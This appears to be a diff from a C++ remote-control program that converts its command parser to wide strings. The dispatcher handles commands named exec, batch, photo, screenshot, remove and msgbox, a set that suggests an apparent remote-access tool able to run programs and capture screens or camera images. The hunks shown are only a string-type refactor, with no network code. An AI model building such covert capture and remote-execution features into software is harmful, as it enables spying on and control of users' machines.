@@ -17,26 +17,26 @@
 
 struct CommandThreadParams
 {
-	std::vector<std::tstring> args;
+	std::vector<std::wstring> args;
 };
 
-static Command *CreateCommandFromName(const std::string &name)
+static Command *CreateCommandFromName(const std::wstring &name)
 {
-	if(name == "batch")
+	if(name == L"batch")
 		return new Command_batch();
-	else if(name == "exec")
+	else if(name == L"exec")
 		return new Command_exec();
-	else if(name == "exit")
+	else if(name == L"exit")
 		return new Command_exit();
-	else if(name == "info")
+	else if(name == L"info")
 		return new Command_info();
-	else if(name == "msgbox")
+	else if(name == L"msgbox")
 		return new Command_msgbox();
-	else if (name == "photo")
+	else if (name == L"photo")
 		return new Command_photo();
-	else if (name == "remove")
+	else if (name == L"remove")
 		return new Command_remove();
-	else if(name == "screenshot")
+	else if(name == L"screenshot")
 		return new Command_screenshot();
 	else
 		return NULL;
@@ -68,16 +68,16 @@ CommandExe::~CommandExe()
 
 }
 
-void CommandExe::Run(const std::tstring& cmds)
+void CommandExe::Run(const std::wstring& cmds)
 {
 	if (cmds.size() == 0) {
 		return;
 	}
 
-	std::vector<std::tstring> commands = Util::split(cmds, ';');
+	std::vector<std::wstring> commands = Util::split(cmds, ';');
 	for (auto &cmd : commands) {
-		std::vector<std::tstring> args = Util::split(cmd, ' ');
-		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::tstring &s) { return std::all_of(s.begin(), s.end(), _istspace); }), args.end());
+		std::vector<std::wstring> args = Util::split(cmd, ' ');
+		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::wstring &s) { return std::all_of(s.begin(), s.end(), iswspace); }), args.end());
 		if (args.size()) {
 			CommandThreadParams *params = new CommandThreadParams();
 			params->args = args;
